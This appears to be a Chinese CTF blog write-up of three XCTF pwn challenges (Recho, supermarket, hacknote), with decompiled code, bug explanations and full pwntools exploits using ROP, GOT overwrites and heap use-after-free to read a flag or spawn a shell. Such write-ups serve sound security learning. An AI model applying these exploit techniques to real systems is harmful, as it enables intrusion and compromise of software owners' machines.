# Challenges 100 Week 1


# <span id ="jump">Challenges_100-Week_1</span>

|              Challenges               |           Tricks            |
| :-----------------------------------: | :-------------------------: |
|       [攻防世界-Recho](# recho)       | `Hack got`+`ROP`+experience |
| [攻防世界-supermarket](# supermarket) |      `UAF`+`Hack got`       |
|    [攻防世界-hacknote](# hacknote)    |            `UAF`            |

新的一年百题斩的flag，开始拔旗了。不知道自己能不能坚持下去。总之，大致的形式就是这样，我会把大纲放到开头方便进行跳转。

Week_1，两道heap，本地都打不通远程就行。猜测是环境问题。

<!-- more -->

# <span id ="recho">Recho</span>

## checksec

```shell
[*] '/home/giantbranch/Desktop/pwn/recho/recho'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## ida

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char nptr[16]; // [rsp+0h] [rbp-40h] BYREF
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  int v6; // [rsp+38h] [rbp-8h]
  int v7; // [rsp+3Ch] [rbp-4h]

  Init(argc, argv, envp);
  write(1, "Welcome to Recho server!\n", 0x19uLL);
  while ( read(0, nptr, 0x10uLL) > 0 )
  {
    v7 = atoi(nptr);
    if ( v7 <= 15 )
      v7 = 16;
    v6 = read(0, buf, v7);
    buf[v6] = 0;
    printf("%s", buf);
  }
  return 0;
}
```

看起来是一个简单的程序，可以溢出任意字节长度。但是溢出点在while循环中，这样就有一个问题，如何跳出循环？

pwntools有一个shutdown可以用来关闭流，但是在关闭流之后，程序就停止了运行，就像你在终端使用了`ctrl`+`D`。一次性要完成所有操作，那么暴露地址的方式肯定不能完成，幸运的是，我们可以使用系统调用(syscall)。对于有些系统,system 也可以用系统调用,而对于有些系统则不行，因此，我们这里不再 geshell，我们直接读取 flag，然后打印出来。

思路：open打开文件，用read读取flag，使用printf打印出来。

**open("flag","r")**

通过修改got表的方式调用open，

```assembly
.text:000000000040070D                 align 2
.text:000000000040070E                 dw 0C307h
```

**这里有一个这样的指令，将它undefine，然后code**，就变成了这样

```assembly
.text:000000000040070D                 add     [rdi], al
.text:000000000040070F                 retn
```

很神奇，大师傅只说是经验，具体的原理也不太清楚~~记下来就好。。。

add命令将rdi地址对应的值加上al所保存的值。那么，如果 rdi 里存储着 alarm 的 GOT 表地址， 那么 add [rdi],al 就是把 GOT 表里指向的地址向后偏移 al，由于 alarm 函数向后偏移 0x5 个字 节处调用了 syscall，因此，如果我们的 al 为 0x5，那么，add 指令执行后，我们的 alarm 函 数 GOT 表里的地址就指向了 syscall 的调用处，那么我们调用 alarm 也就是调用 syscall，我 们只需在之前传入 eax（系统调用号），就可以调用我们需要的系统调用。

flag字符串可以在程序种找到，r对应的字符标识符为0

（这个题似乎应该给一下libc的，但是并没有。。）

```python
#hack got
payload='a'*0x38+p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(5)+p64(add_rdi)
#open flag r
payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(2)+p64(alarm_plt)
```

**read(flag, bss,  100)**

打开之后将flag读到程序的bss段，调用read函数。打开的第一个文件标识符为3。

```python
#read(3,bss,100)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(0)+p64(pop_rdx)+p64(100)+p64(read_plt)
```

**printf(flag)**

不用控制所有的参数，直接传入flag地址就行。

```python
#printf(flag)
payload+=p64(pop_rdi)+p64(bss)+p64(printf_plt)
```

## exp

完整exp如下：

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./recho')
	elf = ELF('./recho')
else:
	p=remote('220.249.52.133',43279)
	elf = ELF('./recho')
alarm_got=elf.got['alarm']
alarm_plt=elf.plt['alarm']
read_plt=elf.plt['read']
printf_plt=elf.plt['printf']
pop_rdi=0x4008a3
pop_rsi=0x4008a1
pop_rax=0x4006fc
add_rdi=0x40070d
pop_rdx=0x4006fe
main=0x0400791
flag=0x601058
bss=0x601070
#gdb.attach(p)
p.recvuntil('Welcome to Recho server!\n')
p.sendline(str(0x200))
#hack got
payload='a'*0x38+p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(5)+p64(add_rdi)
#open flag r
payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(2)+p64(alarm_plt)
#read(3,bss,100)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(0)+p64(pop_rdx)+p64(100)+p64(read_plt)
#printf(flag)
payload+=p64(pop_rdi)+p64(bss)+p64(printf_plt)
payload=payload.ljust(0x200,'\x00')
p.sendline(payload)
p.shutdown('send')
p.interactive()
```

# <span id ="supermarket">supermarket</span>

## checksec

```shell
[*] '/home/giantbranch/Desktop/pwn/supermarket/supermarket'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

这个heap竟然没保护全开

## ida

```c
//main
void sub_8048FC1()
{
  while ( 1 )                                   
  {
    menu();
    printf("your choice>> ");
    switch ( sub_804882E() )
    {
      case 1:
        add();
        break;
      case 2:
        del();
        break;
      case 3:
        list();
        break;
      case 4:
        change_price();
        break;
      case 5:
        change_descrip();
        break;
      case 6:
        exit(0);
        return;
      default:
        puts("invalid choice");
        break;
    }
  }
}

//add
int sub_80488DD()
{
  char *v1; // ebx
  char *v2; // ebx
  char src[16]; // [esp+4h] [ebp-24h] BYREF
  int v4; // [esp+14h] [ebp-14h]
  int v5; // [esp+18h] [ebp-10h]
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i <= 15 && (&s2)[i]; ++i )
    ;
  if ( i > 15 )
    return puts("no more space");
  printf("name:");
  reads((int)src, 16);
  v5 = sub_8048D45(src);
  if ( v5 != -1 )
    return puts("name exist");
  v5 = sub_8048D95();
  if ( v5 == -1 )
    return puts("no more space");
  (&s2)[v5] = (char *)malloc(0x1Cu);
  strcpy((&s2)[v5], src);
  printf("name:%s\n", src);
  v4 = 0;
  printf("price:");
  v4 = sub_804882E();
  printf("price:%d\n", v4);
  if ( v4 > 0 && v4 <= 999 )
    *((_DWORD *)(&s2)[v5] + 4) = v4;
  *((_DWORD *)(&s2)[v5] + 5) = 0;
  while ( *((int *)(&s2)[v5] + 5) <= 0 || *((int *)(&s2)[v5] + 5) > 256 )
  {
    printf("descrip_size:");
    v1 = (&s2)[v5];
    *((_DWORD *)v1 + 5) = sub_804882E();
  }
  printf("descrip_size:%d\n", *((_DWORD *)(&s2)[v5] + 5));
  v2 = (&s2)[v5];
  *((_DWORD *)v2 + 6) = malloc(*((_DWORD *)v2 + 5));
  printf("description:");
  return reads(*((_DWORD *)(&s2)[v5] + 6), *((_DWORD *)(&s2)[v5] + 5));
}

int change_descrip()
{
  int v1; // [esp+8h] [ebp-10h]
  int size; // [esp+Ch] [ebp-Ch]

  v1 = sub_8048DC8();
  if ( v1 == -1 )
    return puts("not exist");
  for ( size = 0; size <= 0 || size > 256; size = sub_804882E() )
    printf("descrip_size:");
  if ( *((_DWORD *)(&s2)[v1] + 5) != size )
    realloc(*((void **)(&s2)[v1] + 6), size);    //漏洞处
  printf("description:");
  return reads(*((_DWORD *)(&s2)[v1] + 6), *((_DWORD *)(&s2)[v1] + 5));
}
```

分析整个程序，商品的结构大致为：

```c
struct{
    char name[16];
    int price;
    int descrip_size;
    char *descrip;
}
```

s2处是一个结构体数组很容易看出来，但是这个结构体就不太容易。我不明白name的字节大小应该是16，伪c代码却显示的+4、+5？所以我去看了汇编代码，这才理清了结构体的结构。

del函数中，将结构体指针指向NULL，所以这里没有可以利用的地方。

利用点在change_descrip中，这里要介绍realloc的实现原理：

> 1.对ptr进行判断，如果ptr为NULL，则函数相当于malloc(new_size),试着分配一块大小为new_size的内存，如果成功将地址返回，否则返回NULL。如果ptr不为NULL，则进入2
> 2.查看ptr是不是在堆中，如果不是的话会跑出异常错误，会发生realloc invalid pointer。如果ptr在堆中，则查看new_size大小，如果new_size大小为0，则相当于free(ptr)，讲ptr指针释放，返回NULL，如果new_size小于原大小，则ptr中的数据可能会丢失，只有new_size大小的数据会保存（这里很重要），如果size等于原大小，等于啥都没做，如果size大于原大小，则看ptr所在的位置还有没有足够的连续内存空间，如果有的话，分配更多的空间，返回的地址和ptr相同，如果没有的话，在更大的空间内查找，如果找到size大小的空间，**将旧的内容拷贝到新的内存中，把旧的内存释放掉**，则返回新地址，否则返回NULL。

就是这个把旧的内存释放，而新内存地址的指针并没有返回取代旧地址。所以我们得到了一个被释放的内存空间。这时再次申请一块内存就又把它拿到了手里。这样我们有了指向同一内存的两个指针。UAF漏洞！

接下来对漏洞进行利用，在结构体中有一个descrip的指针，修改使其指向atoi的got表，泄露libc地址。然后将其修改为system地址，传入参数“/bin/sh”。

1. 申请第一个node_1，description_size>fastbin，第二个node_2，防止chunk与top chunk合并，size随意；
2. 利用realloc，free第一个chunk_1，不要写入东西，否则会破坏chunk结构，导致下面的malloc失败。
3. 申请node_3，由于步骤2中的node_1->descrip被free，所以在unsorted bin中。chunk被切割为两部分，一部分用来存放结构体，一部分用来存放descrip。

4. 修改node_1的descrip，即改变node_3的结构，使其descrip指向atoi_got。
5. 利用list泄露libc地址。
6. 修改descrip指向system，选项输入‘/bin/sh’。get shell！

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./supermarket'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',47082)

elf = ELF(binary,checksec=False)
libc=ELF('./libc.so.6')
atoi_got=elf.got["atoi"]

def create(name,size,context):
	p.sendlineafter('your choice>> ','1')
	p.sendlineafter('name:',str(name))
	p.sendlineafter('price:','99')
	p.sendlineafter('descrip_size:',str(size))
	p.sendlineafter('description:',context)

def dele(name,size,context):
	p.sendlineafter('your choice>> ','5')
	p.sendlineafter('name:',str(name))
	p.sendlineafter('descrip_size:',str(size))
	p.sendlineafter('description:',context)

create(1,0x80,'ppp')
create(2,0x20,'aaa')

dele(1,0x90,'')
create(3,0x20,'bbb')
payload='3'.ljust(16,'\x00')+p32(99)+p32(0x20)+p32(atoi_got)
dele(1,0x80,payload)

p.sendlineafter('your choice>> ','3')
p.recvuntil('3: price.99, des.')
atoi_addr=u32(p.recvuntil('\n').split('\n')[0].ljust(4,'\x00'))

libcbase=atoi_addr-libc.symbols['atoi']
system=libcbase+libc.symbols['system']
dele(3,0x20,p32(system))
p.sendline('/bin/sh\x00')

p.interactive()
```

# <span id="hacknote">hacknote</span>
## checksec
```shell
[*] '/home/giantbranch/Desktop/pwn/hacknote/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
## ida

```c
void __cdecl __noreturn main()
{
  int v0; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v0 = atoi(buf);
      if ( v0 != 2 )
        break;
      del();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        print();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```

ptr为一个数组，存放指向8字节大小的内存空间。前四字节为puts的函数地址，后四字节为note申请的内存空间地址。

思路就是leak一个libc地址，然后控制那8字节空间，func地址为system，note中为‘/bin/sh’地址。从而get shell。

free后的指针没有被销毁，首先申请两个size>0x8的chunk。然后都free掉，fastbin中就有了四个chunk。其中控制堆块是在同一个bin中的，size都是0x8。这时申请新的size为0x8的note，我们就会获得这两个堆块。这个块的content就是note0的控制堆块。修改后四字节为puts_got,leak出libc的地址。然后free掉这个块，再申请回来，把地址改为system，后面的内容改为‘||sh’ or ‘;sh’。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
#context.arch="amd64"
local=0
binary='./hacknote'

#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',49663)
elf = ELF(binary,checksec=False)
libc=ELF('libc_32.so.6',checksec=False)

def create(size,content):
	p.sendlineafter("Your choice :",'1')
	p.sendlineafter("Note size :",str(size))
	p.sendlineafter("Content :",str(content))

def dele(index):
	p.sendlineafter("Your choice :",'2')
	p.sendlineafter("Index :",str(index))

def show(index):
	p.sendlineafter("Your choice :",'3')
	p.sendlineafter("Index :",str(index))

create(0x10,'a'*0x10)
create(0x10,'b'*0x10)
dele(0)
dele(1)
create(0x8,p32(0x804862B)+p32(elf.got['puts']))

#gdb.attach(p)
p.sendlineafter("Your choice :",'3')
p.recvuntil('Index :')
p.sendline('0')
puts_addr=u32(p.recv(4))
print hex(puts_addr)

libcbase=puts_addr-libc.symbols['puts']
system=libcbase+libc.symbols['system']

dele(2)
create(0x8,p32(system)+'||sh')
show(0)

p.interactive()
```

[TOP](# jump)


